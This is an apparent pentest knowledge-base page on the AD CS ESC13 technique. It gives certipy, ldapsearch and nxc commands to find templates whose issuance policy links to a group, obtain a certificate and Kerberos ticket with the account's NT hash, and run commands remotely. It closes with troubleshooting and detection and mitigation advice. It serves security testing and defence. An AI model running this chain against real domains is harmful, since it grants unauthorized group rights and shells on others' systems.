---
title: AD CS — ESC13 (issuance policy linked to a group)
tags: [windows, adcs, kerberos, esc13, privesc]
---

# AD CS: ESC13, a certificate that puts you in a group

**English** | [🇪🇸 Español](adcs-esc13.md)

## 1. What it is

A template can carry an **issuance policy** (`msPKI-Certificate-Policy`) with an OID. That OID points to a policy object whose `msDS-OIDToGroupLink` attribute links to a domain group. When the certificate is used for **PKINIT**, the KDC adds that group's SID to the PAC: the resulting session has the group's rights even though the account is not a member.

That is the difference from ESC1: you are not impersonating anyone, you are being granted a group. If the group sits in the target's `LocalGroups` / `Remote Desktop Users` / WinRM list, you have a shell.

## 2. Enumerate

```bash
certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <DC_IP> -vulnerable -stdout
```

In the output the template is flagged `ESC13` and shows:

```text
Certificate Policies : <OID>
Issuance Policy      : <policy name>
Linked Group         : <DOMAIN>\<group>
```

By hand:

```bash
certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <DC_IP> -template '<TEMPLATE>'
ldapsearch -x -H ldap://<DC_IP> -D '<user>@<domain>' -w '<password>' \
  -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>' \
  '(msDS-OIDToGroupLink=*)' msDS-OIDToGroupLink
```

## 3. Request the certificate and authenticate

```bash
certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA>' -template '<TEMPLATE>' -dc-ip <DC_IP>
certipy auth -pfx '<user>.pfx' -dc-ip <DC_IP>
```

`certipy auth` returns a `ccache` and the account's NT hash. With the `ccache`:

```bash
export KRB5CCNAME='<user>.ccache'
nxc winrm <TARGET> -k --use-kcache
nxc smb <TARGET> -k --use-kcache -x 'whoami /groups'
```

`whoami /groups` must show the linked group. If it does not, the PAC predates the change or the ticket belongs to another realm.

## 4. When it fails

- **`KRB_AP_ERR_SKEW`** → clock off by more than 5 minutes. See [clock and Kerberos](../general/kerberos-clock.en.md).
- **`KDC_ERR_CLIENT_NOT_TRUSTED`** → the certificate does not chain to a CA in `NTAuthCertificates`.
- **`KDC has no support for encryption type`** → the KDC rejects the certificate's key type; retry with `-dc-ip` and a template using modern RSA.
- **Certificate issued but no group** → the OID has no link, or the link targets a group in another domain.
- **`certipy req` asks for credentials again** → the template requires manager approval (`msPKI-Enrollment-Flag` with `PEND_ALL_REQUESTS`).

## 5. Detection and mitigation

- Events **4886/4887** (certificate requested/issued) for templates with an issuance policy, especially from accounts that did not use them before.
- **4768** with certificate `PreAuthType` (PKINIT) toward a host the account never touched.
- Audit `msDS-OIDToGroupLink` links and issuance policies; remove them when not strictly needed.
- Require approval or authorized signatures on those templates and restrict who may enrol.
- Monitor object creation under `CN=OID,CN=Public Key Services`.

MITRE: T1649, T1558, T1078.
